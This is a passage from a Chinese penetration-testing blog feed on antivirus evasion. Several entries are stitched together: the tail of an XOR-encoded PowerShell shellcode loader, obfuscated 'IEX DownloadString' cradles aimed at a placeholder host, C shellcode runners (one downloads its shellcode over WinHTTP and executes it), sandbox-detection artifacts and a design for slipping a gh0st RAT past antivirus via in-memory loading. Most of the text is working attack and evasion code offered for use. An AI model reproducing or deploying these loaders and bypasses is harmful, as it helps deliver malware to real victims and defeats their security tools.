($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))};function func_get_delegate_type {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,[Parameter(Position = 1)] [Type] $var_return_type = [Void]);$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed');$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed');return $var_type_builder.CreateType()};If ([IntPtr]::size -eq 8) {[Byte[]]$var_code = 230,82,153,254,234,242,210,26,26,26,91,75,91,74,72,75,76,82,43,200,127,82,145,72,122,82,145,72,2,82,145,72,58,82,145,104,74,82,21,173,80,80,87,43,211,82,43,218,182,38,123,102,24,54,58,91,219,211,23,91,27,219,248,247,72,91,75,82,145,72,58,145,88,38,82,27,202,124,155,98,2,17,24,111,104,145,154,146,26,26,26,82,159,218,110,125,82,27,202,74,145,82,2,94,145,90,58,83,27,202,249,76,82,229,211,91,145,46,146,82,27,204,87,43,211,82,43,218,182,91,219,211,23,91,27,219,34,250,111,235,86,25,86,62,18,95,35,203,111,194,66,94,145,90,62,83,27,202,124,91,145,22,82,94,145,90,6,83,27,202,91,145,30,146,82,27,202,91,66,91,66,68,67,64,91,66,91,67,91,64,82,153,246,58,91,72,229,250,66,91,67,64,82,145,8,243,85,229,229,229,71,112,26,83,164,109,115,116,115,116,127,110,26,91,76,83,147,252,86,147,235,91,160,86,109,60,29,229,207,82,43,211,82,43,200,87,43,218,87,43,211,91,74,91,74,91,160,32,76,99,189,229,207,241,105,64,82,147,219,91,162,21,61,26,26,87,43,211,91,75,91,75,112,25,91,75,91,160,77,147,133,220,229,207,241,67,65,82,147,219,82,43,200,83,147,194,87,43,211,72,114,26,24,90,158,72,72,91,160,241,79,52,33,229,207,82,147,220,82,153,217,74,112,16,69,82,147,235,82,147,192,83,221,218,229,229,229,229,87,43,211,72,72,91,160,55,28,2,97,229,207,159,218,21,159,135,27,26,26,82,229,213,21,158,150,27,26,26,241,201,243,254,27,26,26,242,184,229,229,229,53,47,77,98,67,26,218,42,11,236,149,201,251,204,220,64,129,163,25,180,84,43,66,101,79,111,242,85,216,18,90,199,48,212,5,88,53,247,178,185,227,158,220,215,153,62,176,117,55,14,251,20,228,201,120,104,7,232,65,30,45,98,54,249,9,121,198,53,189,153,110,202,220,254,251,82,19,125,46,26,79,105,127,104,55,91,125,127,116,110,32,58,87,117,96,115,118,118,123,53,47,52,42,58,50,121,117,119,106,123,110,115,120,118,127,33,58,87,73,83,95,58,35,52,42,33,58,77,115,116,126,117,109,105,58,84,78,58,44,52,42,33,58,78,104,115,126,127,116,110,53,47,52,42,51,23,16,26,41,167,140,23,122,110,225,235,126,193,86,236,74,58,43,108,214,247,158,133,246,52,202,48,251,53,214,156,196,185,191,22,148,155,185,114,202,123,188,143,155,70,17,95,32,118,240,201,135,186,168,203,211,168,41,69,74,25,168,42,215,44,90,124,209,175,24,221,195,250,174,192,127,197,110,70,7,135,214,191,63,3,232,186,97,196,22,195,92,130,21,158,254,7,91,210,67,95,221,177,210,209,192,186,70,44,138,175,245,127,176,78,190,184,136,92,82,205,108,115,184,254,34,33,192,72,168,178,31,213,211,209,89,162,197,155,29,242,139,154,160,15,11,184,160,178,33,103,137,155,90,88,125,54,225,217,12,2,81,219,130,45,27,231,147,200,252,43,196,20,238,149,101,102,211,107,74,11,226,38,0,240,150,54,15,151,134,178,96,242,144,215,60,20,173,135,45,37,155,85,96,67,99,18,129,223,164,55,75,1,140,139,88,103,253,42,127,245,208,251,109,226,124,27,222,26,91,164,234,175,184,76,229,207,82,43,211,160,26,26,90,26,91,162,26,10,26,26,91,163,90,26,26,26,91,160,66,190,73,255,229,207,82,137,73,73,82,147,253,82,147,235,82,147,192,91,162,26,58,26,26,83,147,227,91,160,8,140,147,248,229,207,82,153,222,58,159,218,110,172,124,145,29,82,27,217,159,218,111,205,66,66,66,82,31,26,26,26,26,74,217,242,133,231,229,229,43,35,40,52,43,44,34,52,43,47,41,52,43,43,42,26,26,26,26,18;for ($x = 0; $x -lt $var_code.Count; $x++) {$var_code[$x] = $var_code[$x] -bxor 26;};$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40);[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length);$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])));$var_runme.Invoke([IntPtr]::Zero)}}.ToString();iex $string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># readbytes.ps1[Byte[]]$bytes = [System.IO.File]::ReadAllBytes($args[0])$s = ""for ($x = 0; $x -lt $bytes.Count; $x++) {        $s += $bytes[$x]        $s += ","}$s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.37-powershell-fen-chi-mian-sha-si-lu-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.37-powershell-fen-chi-mian-sha-si-lu-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="Powershell免杀思路"><a href="#Powershell免杀思路" class="headerlink" title="Powershell免杀思路"></a>Powershell免杀思路</h2><p>先介绍一下powershell<a href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&amp;spm=1001.2101.3001.7020">木马</a>最常用的方式，一般都为远程下载然后执行的方法，特点就是：直接内存运行，无文件落地。<br>例如：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常使用过程中当调用powershell进行远程下载执行时，会被杀软进行拦截。那么针对Powershell的免杀有两个思路：</p><ol><li>对ps1文件进行免杀处理</li><li>对Powershell的行为进行免杀处理</li></ol><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a>免杀方法</h2><h3 id="1-使用关键字拆分进行bypass"><a href="#1-使用关键字拆分进行bypass" class="headerlink" title="1. 使用关键字拆分进行bypass"></a>1. 使用关键字拆分进行bypass</h3><hr><p>在实战过程中，一些杀软是会对powershell命令当中的参数、函数进行一个检测，那么此时就可以对关键字进行拆分来进行绕过。<br>例如，拆分前的powershell命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>假如杀软是对http这个关键字进行检测，那么我们可以对其进行如下拆分进行绕过，拆分后的powershell命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://x.x.x.x/a''));Invoke-Mimikatz';IEX ($a+$b)”1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>假如是对downloadstring这个函数进行检测，那么我们可以使用replace来进行替换函数拆分downloadstring进行一个绕过，拆分后的powershell命令如下：</p><pre class="line-numbers language-none"><code class="language-none">powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='123(''http://x.x.x.x'')'.Rep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-Fuzz思想进行bypass"><a href="#2-Fuzz思想进行bypass" class="headerlink" title="2. Fuzz思想进行bypass"></a>2. Fuzz思想进行bypass</h3><hr><p>可以利用Fuzz的思想进行bypass，例如可以使用中文字符里的单引号进行bypass<br>例如，利用单引号混淆前的powershell命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a’))”1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用单引号混淆后的命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe "IEX ((new-object net.webclient).downloadstring('ht‘+’tp://x.x.x.x/a’))”1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-超长命令bypass"><a href="#3-超长命令bypass" class="headerlink" title="3. 超长命令bypass"></a>3. 超长命令bypass</h3><hr><p>可以使用超长的命令来进行bypass。<br>例如，利用超长命令bypas前的powershell命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a’))”1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进行超长命令构造后的powershell命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal w Normal -w Normal -w Normal -w Normal -w Normal -w Normal IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-使用copy命令进行bypass"><a href="#4-使用copy命令进行bypass" class="headerlink" title="4. 使用copy命令进行bypass"></a>4. 使用copy命令进行bypass</h3><hr><p>这里讲一个骚操作，一些杀软是检测powershell这个使用的动作，那么我们可以使用windows的copy命令，将powshell进行拷贝命名为其他的，例如，使用copy命令将powershell拷贝一个并命名为bypass.txt<br>命令：</p><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.txt1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么后面就可以这样子来执行powershell来进行绕过杀软检测：</p><pre class="line-numbers language-none"><code class="language-none">bypass.txt IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-混合bypass"><a href="#5-混合bypass" class="headerlink" title="5. 混合bypass"></a>5. 混合bypass</h3><hr><p>就是将前面讲述的几种方法进行混合使用。<br>例如：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString('ht‘+’tp://x.x.x.x/a')1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>当然除了上述的几种方式可以进行bypass以外，还有其他的方法，例如可以将 powershell命令打包成exe程序进行绕过，可以使用C、Python、go等，其中查杀率：C &gt; Python &gt; go</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.37-powershell-fen-chi-shellcode-mian-sha-ji-chu-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.37-powershell-fen-chi-shellcode-mian-sha-ji-chu-er/</url>
      
        <content type="html"><![CDATA[<h2 id="下载shellcode"><a href="#下载shellcode" class="headerlink" title="下载shellcode"></a>下载shellcode</h2><p>shellcode地址:<a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>设置msfconsole监听</p><p><a href="https://cuokon.github.io/image/shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/2.png" title="监听"><img src="https://cuokon.github.io/image/shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/2.png" alt="监听"></a></p><p><a href="https://cuokon.github.io/image/shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/2.png" title="监听">监听</a></p><p><code>记住payload要设置对,反正反弹的shell接收不了</code></p><p>然后用shell执行我们生成的木马就可以反弹shell了</p><p><a href="https://cuokon.github.io/image/shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/3.gif" title="反弹shell"><img src="https://cuokon.github.io/image/shellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/3.gif" alt="反弹shell"></a></p><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include "windows.h"using namespace std;int main(int argc, char **argv){    unsigned char buf[] =        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"        "\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"        "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"        "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"        "\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, buf, sizeof buf);    ((void(*)())exec)();    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果要把shellcode单独分离 我们可以通过其他当时获取到shellcode，而不是事先讲shellcode写死在程序中</p><p>举例：shellcode从文本提取或从远程下载获取。</p><p>这里就把shellcode通过http请求(使用winhttp api)获取赋值到内存缓存数组，动态分配内存执行shellcode:</p><pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winhttp.h&gt;#pragma comment(lib,"winhttp.lib")#pragma comment(lib,"user32.lib")using namespace std;void main(){    DWORD dwSize = 0;    DWORD dwDownloaded = 0;    LPSTR pszOutBuffer = NULL;    HINTERNET  hSession = NULL,        hConnect = NULL,        hRequest = NULL;    BOOL  bResults = FALSE;    hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);    if (hSession)    {        hConnect = WinHttpConnect(hSession, L"127.0.0.1", INTERNET_DEFAULT_HTTP_PORT, 0);    }    if (hConnect)    {        hRequest = WinHttpOpenRequest(hConnect, L"POST", L"qing.txt", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);    }    LPCWSTR header = L"Content-type: application/x-www-form-urlencoded/r/n";    SIZE_T len = lstrlenW(header);    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);    if (hRequest)    {        std::string data = "name=host&amp;sign=xx11sad";        const void *ss = (const char *)data.c_str();        bResults = WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);        ////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );    }    if (bResults)    {        bResults = WinHttpReceiveResponse(hRequest, NULL);    }    if (bResults)    {        do        {            // Check for available data.            dwSize = 0;            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))            {                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());                break;            }            if (!dwSize)                break;            pszOutBuffer = new char[dwSize + 1];            if (!pszOutBuffer)            {                printf("Out of memory\n");                break;            }            ZeroMemory(pszOutBuffer, dwSize + 1);            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))            {                printf("Error %u in WinHttpReadData.\n", GetLastError());            }            else            {                printf("ok");            }            //char ShellCode[1024];            int code_length = strlen(pszOutBuffer);            char* ShellCode = (char*)calloc(code_length  /2 , sizeof(unsigned char));            for (size_t count = 0; count &lt; code_length / 2; count++){                sscanf(pszOutBuffer, "%2hhx", &amp;ShellCode[count]);                pszOutBuffer += 2;            }            printf("%s", ShellCode);            //strcpy(ShellCode,pszOutBuffer);            void *exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);            memcpy(exec, ShellCode, sizeof ShellCode);            ((void(*)())exec)();            delete[] pszOutBuffer;            if (!dwDownloaded)                break;        } while (dwSize &gt; 0);    }    if (hRequest) WinHttpCloseHandle(hRequest);    if (hConnect) WinHttpCloseHandle(hConnect);    if (hSession) WinHttpCloseHandle(hSession);    system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.36-yun-sha-xiang-shi-bie-fang-shi-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.36-yun-sha-xiang-shi-bie-fang-shi-yi/</url>
      
        <content type="html"><![CDATA[<p>随着高级可持续攻击威胁对抗技术的不断发展，针对恶意代码进行分析，检测未知恶意代码，经常利用虚拟机技术。RSA展会也有很多安全厂商使用这些技术进行反APT分析，传统的反病毒厂商和僵尸网络追踪团队也都利用虚拟机进行大量的分析获取样本运行的海量信息进行分析处理。厂商们所使用的虚拟机软件通常包括VMware、VirtualBox等，这些虚拟机可以在一台物理计算机上模拟出多台虚拟的计算机，这些虚拟机完全就像真正的计算机那样进行工作。攻击者为了逃避这些虚拟机以及病毒分析沙箱，会在恶意程序中加入检测虚拟机及沙箱的代码，以判断程序所处的运行环境。当发现程序处于虚拟机沙箱中时，它就会改变操作行为隐蔽恶意动作，逃避检测。</p><pre class="line-numbers language-none"><code class="language-none">虚拟机识别包括对系统的注册表、文件系统、进程识别。虚拟机的注册表中会记录虚拟机信息相关的键值，文件系统中有与虚拟机相关的文件、文件夹，任务进程中，也会运行一些特殊的进程，这类进程名可作为识别虚拟机检测的依据。例如判断%System32\drivers\目录下是否存在hgfs.sys、prleth.sys、vmhgfs.sys驱动文件，其中hgfs.sys驱动文件为VMware Tools的驱动文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1658364596058/4b0ca8131a8b408e81cc683793b72b83.png" alt="image.png"></p><p>利用I/O虚拟化识别虚拟机。VMM 通过 I/O 虚拟化来复用有限的外设资源，其通过截获 Guest OS 对 I/O 设备的访问请求，然后通过软件模拟真实的硬件。而虚拟机相应的接口上会有与虚拟机相关的接口类型、序列号、产品ID等信息，通过获取这类信息，亦可检测出虚拟机的存在。VMware的虚拟机中使用特殊指令IN获取版本信息是最常用的识别VMware的方法。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1658364596058/6ac1bad6f3114cab9e7ed417671fbd15.png" alt="image.png"></p><p>x86 ISA 识别。x86 ISA 中有十多条敏感指令不是特权指令，因此x86 无法使用经典的虚拟化技术完全虚拟。例如，sgdt/sidt/sldt等指令可以在用户态读取特权寄存器GDTR/IDTR/LDTR 的值；popf/pushf等指令在 Ring0 和 Ring3 的执行结果不同；其它的还有 smsw, lar, lsl, verr,verw, pop, push, call, jmp, int n, ret, str, move等指令。这些指令是无法在VM上直接运行的，必须通过VMM来实现。而如此实现的指令，虚拟机上和物理主机上是有差异的，而根据这些差异，便能做虚拟机的检测。</p><p>针对恶意代码分析沙箱检测则更进一步，操作系统用户名,自身样本路径,注册表中操作系统ID,进程名,系统中窗口名等都是恶意代码用于检测沙箱的对象.比如HKLM\Microsoft\Windows\CurrentVersion下列产品ID键值</p><p>55274-640-2673064-23950 (JoeBox)</p><p>76487-644-3177037-23510 (CWSandbox)</p><p>76487-337-8429955-22614 (Anubis)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.35.3-ren-yi-rat-gai-jia-zai-qi-guo-yun-sha-pan/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.35.3-ren-yi-rat-gai-jia-zai-qi-guo-yun-sha-pan/</url>
      
        <content type="html"><![CDATA[<p>以看到是经过加密且Bypass。</p><p>接下来笔者把加密好的Shellcode.dll放到Http下载地址里。（Http下载服务器搭建，笔者在这里就不详细说明）<br>将URL:<a href="http://url/ShellCode.dll">http://URL/ShellCode.dll</a> 加密，得到加密过后的下载地址：TVFRVR8KClxLT0ATExMLQxYWFxcLS0BRCmxLUUBXS0BRBXZNSldRRlBRC3VASlVJQAt3QElAU0RLRkALdFBAV1xmSUxAS1ELcHdpJQ==</p><p>在这里有一个注意点，笔者用的这个地址加密不只有Base64，还有Rc4，所以大家解不开是正常的。</p><p><a href="https://p4.ssl.qhimg.com/t01dbb1e88c23f5e529.png"><img src="https://p4.ssl.qhimg.com/t01dbb1e88c23f5e529.png"></a></p><p>这就是上面提到的思路，他是一个加载器（或者通俗点下载者），其作用是：</p><p>解密 ==&gt; 加密后的地址 ==&gt; 下载文件到内存 ==&gt; 执行</p><p>测试上线，这里选择虚拟机测试，懂得都懂，毕竟后门或者啥的我也没仔细去看。</p><p><a href="https://p5.ssl.qhimg.com/t012c1e4f4d2e9f7362.png"><img src="https://p5.ssl.qhimg.com/t012c1e4f4d2e9f7362.png"></a></p><p>经测试，国内企业杀软，以及Tinder无感执行。至于微步云沙箱或者别的沙箱，笔者就不上传了，免得被记录特征导致代码失效。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.35.2-ren-yi-rat-gai-jia-zai-qi-guo-yun-sha-pan/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.35.2-ren-yi-rat-gai-jia-zai-qi-guo-yun-sha-pan/</url>
      
        <content type="html"><![CDATA[<p>Shellcode是更改对Server.dll的16进制加密器</p><p><a href="https://p2.ssl.qhimg.com/t0156df703c4475d55f.png"><img src="https://p2.ssl.qhimg.com/t0156df703c4475d55f.png"></a></p><p>首先生成一个Server.dll 然后生成加密器和Url加密器。</p><p><a href="https://p5.ssl.qhimg.com/t0130fac9e4d7411f42.png"><img src="https://p5.ssl.qhimg.com/t0130fac9e4d7411f42.png"></a></p><p>通过查杀发现被杀</p><p>运行ShellCode加密Server.dll后查杀可发现已经不杀了</p><p><a href="https://p1.ssl.qhimg.com/t0113bffb6352469ad1.png"><img src="https://p1.ssl.qhimg.com/t0113bffb6352469ad1.png"></a></p><p>笔者来对比一下ShellCode加密前后的Server.dll</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1657590935049/74070564319e4f288464fdce6f164d36.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1657590935049/25fb703a045f4753923d8f0440666500.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.35.1-ren-yi-rat-gai-jia-zai-qi-guo-yun-sha-pan/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.35.1-ren-yi-rat-gai-jia-zai-qi-guo-yun-sha-pan/</url>
      
        <content type="html"><![CDATA[<h2 id="任意RAT改加载器过云沙盘"><a href="#任意RAT改加载器过云沙盘" class="headerlink" title="任意RAT改加载器过云沙盘"></a>任意RAT改加载器过云沙盘</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>沉寂许久，时隔良久，赴当年之约，感触良多。百川赴海返潮易，一叶报秋归树难。今天分享一篇任意RAT Bypass杀软的思路， <strong>提供思路仅供参考，不提供任何源码</strong> 。文章中提到的地方若有错误的地方请指正。</p><p>直入主题，目前RedTeam的主流RAT无非就Cobalt Strike。其他的RAT大多基于C/C#开发（这里不做讨论），小众点的RAT，BUG，兼容性等一系列体验感不是很好。而Cobalt Strike的特征已经被各大厂商记录到特征库中，所以用Cobalt Strike做Bypass的效果并不是很友好。</p><p>此次测试使用的杀毒软件是国内企业杀软，以及Tinder（自行翻译，懂得都懂，毕竟ByPass见光死），RAT使用的是gh0st的变种。<strong>（使用gh0st原因简单阐明：特征多，容易被杀）</strong></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="0X00"><a href="#0X00" class="headerlink" title="0X00"></a>0X00</h3><p>这里笔者拿国内的老版本RAT进行测试。仅提供研究思路，不提供任何源码。</p><p>ShellBase、ShellCode、RomteLoad工程源码使用VS2010编译，念旧。在打开的时候默认VS2019，见谅！Gh0st源码使用VC++6.0编译。</p><p>之前研究目前主流的RAT以及国内一些老版本的RAT，这里笔者就拿国内的老版本RAT进行测试。因为较CS，国内老版RAT特征多能够更好的体现笔者的思路。</p><h3 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h3><p>国内的RAT是基于gh0st以及gh0st的变种。知名的如大灰狼、灰鸽子等。其中，主流的写法是功能插件化（功能插件化，这一点跟CS差不多，插件化的优越性大家都知道的，（简单概括就是：方便、快捷），然后用外壳内存加载功能插件，主机上线后通过IOCP协议传输来调用功能，形成Payload — Server ==&gt; Client为一体的工作环境。</p><p>服务控制端过程大概是：</p><p>功能集成Server.dll =&gt; 16进制加密Server.dll =&gt; 外壳Install解密内存加载Server.dll =&gt; 生成二进制可执行文件</p><h3 id="0X02"><a href="#0X02" class="headerlink" title="0X02"></a>0X02</h3><p>经分析发现现在的杀毒对于这种写法基本看的很死 比如某企业杀软会把一个exe文件区块化去查杀 导致实际操作去Bypass时，做好的Server端一次Bypass基本2-5天就被再次查杀。</p><p>原因：Bypass基本思路都是 杀小红伞基本去处理输入表 杀QVM一般处理代码段。所以，从根本上来看是没改变这种写法的</p><p>笔者的思路是通过下载把Server.dll直接下载到内存里，然后再执行。</p><p>过程大概是：Server.dll =&gt; 16进制加密Server.dll =&gt; 把Server.dll放到下载地址然后base64加密 =&gt; 加载器解密地址下载到内存执行</p><p><strong>这种思路对Cobalt Strike也适用</strong></p><h3 id="0X03"><a href="#0X03" class="headerlink" title="0X03"></a>0X03</h3><p><a href="https://p0.ssl.qhimg.com/t01216784fbcc79513b.png"><img 